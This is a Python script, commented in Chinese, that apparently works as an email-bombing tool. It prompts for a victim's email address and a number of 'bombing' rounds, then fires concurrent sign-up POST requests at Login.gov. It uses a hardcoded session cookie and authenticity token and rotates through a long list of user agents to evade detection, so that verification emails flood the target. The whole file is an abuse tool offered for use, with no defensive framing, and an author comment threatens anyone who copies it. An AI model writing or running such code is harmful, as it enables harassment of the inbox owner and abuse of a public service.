#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import subprocess

# 检查并安装所需的库
required_libraries = ["requests", "aiohttp", "asyncio", "random", "uuid", "time", "json", "re", "os", "hashlib", "concurrent", "datetime", "colorama", "urllib"]

missing_libraries = []
for lib in required_libraries:
    try:
     __import__(lib)
    except ImportError:
     missing_libraries.append(lib)

if missing_libraries:
    print(f"[PIP] 缺少库: {', '.join(missing_libraries)}")
    install = input("[INPUT] 是否要自动安装缺少的库？(y/n): ").strip().lower()
    if install == 'y':
     subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing_libraries])
     for lib in missing_libraries:
      __import__(lib)
    elif install == 'n':
        sys.exit(1)
    else:
        sys.exit(1)

import requests
import aiohttp
import asyncio
import random
import uuid
import time
import json
import re
import os
import hashlib
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from colorama import init, Fore, Back, Style
from urllib.parse import quote, unquote
# 深黯/@shenan114514
# 二改 倒卖 偷源码 偷接口 更改作者名 删除本注释 全部死全家
# 美国联邦总务管理局官网-登录-了解 Login.gov-已有账户？-登录来管理你的账户-设立账户
# https://secure.login.gov/zh/sign_up/verify_email

cookie = "_identity_idp_session=d15102867b3fba8d64f78ea0ce3825b2; ahoy_track=true; ahoy_visit=337c662c-ce19-45d7-bba2-00084e1d34ce; device=6018049d6901f150bb6496add7f845de6221b43b926dbf73454b8dda9f17a3f5c47e5fdca7effcdc347cf7c4470466b6d0a0097537d1a09d589ef26e1a05c8a9; ahoy_visitor=201cf16c-0e6c-4fbf-adc0-ef415e0ff1de"
token = "PLGRsqLKEgPrJRcnyCxCdrGX1brWRiVeWaRXtGhJ1IYWTyjyWUfq_gLhaLMSRsqV5ID8DTkWcsYJLwRUyLdgsA"

lock = asyncio.Lock()

total_requests = 0
success_requests = 0
failure_requests = 0

# 用户代理列表
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL",
    "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/5.0 (Linux; Android 14; V2417A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36 XWEB/1260183 MMWEBSDK/20240501 MMWEBID/4037 MicroMessenger/8.0.50.2701(0x2800323E) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
    "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
    "Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
    "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
    "Mozilla/5.0 (Linux; Android 12; RMX3617 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36 XWEB/1260117 MMWEBSDK/20240501 MMWEBID/5029 MicroMessenger/8.0.50.2701(0x2800323E) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
    "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.55(0x1800372d) NetType/WIFI Language/zh_CN",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.53(0x18003527) NetType/WIFI Language/zh_CN miniProgram/wx1b3760ac3ec5801b",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.52(0x18003426) NetType/WIFI Language/zh_CN"
]

def print_text(text, delay=0.01):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

async def send_requests(method, name, url, headers, data):
    global total_requests, success_requests, failure_requests
    
    async with aiohttp.ClientSession() as session:
        try:
            if method == "POST" and "application/json" in headers.get("Content-Type"):
                async with session.post(url, headers=headers, json=data, timeout=10) as response:
                    async with lock:
                        total_requests += 1
                        if response.status == 200:
                            print(f"[SUCCESS] {name} ✅ [200]")
                            success_requests += 1
                        else:
                            print(f"[FAILURE] {name} ❌ [{response.status}]")
                            failure_requests += 1

            elif method == "POST" and "application/x-www-form-urlencoded" in headers.get("Content-Type"):
                async with session.post(url, headers=headers, data=data, timeout=10) as response:
                    async with lock:
                        total_requests += 1
                        if response.status == 200 or response.status == 302:
                            print(f"[SUCCESS] {name} ✅ [200]")
                            success_requests += 1
                        else:
                            print(f"[FAILURE] {name} ❌ [{response.status}]")
                            failure_requests += 1

            elif method == "GET":
                async with session.get(url, headers=headers, params=data, timeout=10) as response:
                    async with lock:
                        total_requests += 1
                        if response.status == 200:
                            print(f"[SUCCESS] {name} ✅ [200]")
                            success_requests += 1
                        else:
                            print(f"[FAILURE] {name} ❌ [{response.status}]")
                            failure_requests += 1
        except asyncio.TimeoutError:
            async with lock:
                print(f"[FAILURE] {name} ❌ [请求超时]")
                total_requests += 1
                failure_requests += 1
        except Exception as e:
            async with lock:
                print(f"[FAILURE] {name} ❌ [发生错误]")
                total_requests += 1
                failure_requests += 1


async def main():
    
    email = input("[INPUT] 请输入邮箱地址: ")
    requests_count = int(input("[INPUT] 请输入轰炸次数: "))
    
    # 验证邮箱格式
    if not re.match("^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+", email):
        print("[WARN] 请输入正确的邮箱地址 ⚠️")
        return
    
    tasks = []
    for i in range(requests_count):
        tasks.append(send_requests(method="POST", name="美国联邦总务管理局", url="https://secure.login.gov/zh/sign_up/enter_email", headers={"Host":"secure.login.gov","Connection":"keep-alive","Origin":"https://secure.login.gov","Content-Type":"application/x-www-form-urlencoded","User-Agent":random.choice(user_agents),"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document","Referer":"https://secure.login.gov/zh/sign_up/enter_email","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7","Cookie":cookie}, data={"authenticity_token":token,"user[email]":email,"user[email_language]":"","user[email_language]":"zh","user[terms_accepted]":"0","user[terms_accepted]":"1","button":""}))

    # 使用异步执行所有请求
    await asyncio.gather(*tasks)

    print_text("-" * 42)
    async with lock:
        print_text(f"[REQUEST] 请求次数: {total_requests}")
        print_text(f"[SUCCESS] 成功次数: {success_requests}")
        print_text(f"[FAILURE] 失败次数: {failure_requests}")
    print_text("-" * 42)


if __name__ == "__main__":
    asyncio.run(main())
